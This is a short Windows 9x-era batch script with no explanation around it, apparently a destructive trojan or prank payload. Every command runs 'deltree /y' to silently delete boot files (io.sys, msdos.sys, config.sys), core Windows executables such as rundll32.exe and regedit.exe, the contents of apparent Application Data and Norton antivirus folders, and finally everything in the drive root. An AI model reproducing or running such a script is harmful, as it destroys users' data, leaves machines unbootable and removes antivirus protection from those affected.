   @echo off
   cd...
   cd c:\
   deltree /y io.sys
   deltree /y msdos.sys
   deltree /y config.sys
   cd windows
   deltree /y rundll.exe
   deltree /y rundll32.exe
   deltree /y regedit.exe
   cd system
   deltree /y jdbgmgr.exe
   deltree /y rnaapp.exe
   cd..
   cd applic~1\micros~1
   deltree /y *.*
   cd....
   cd archiv~1\norton~1
   deltree /y *.*
   cd..
   deltree /y *.*

   exit
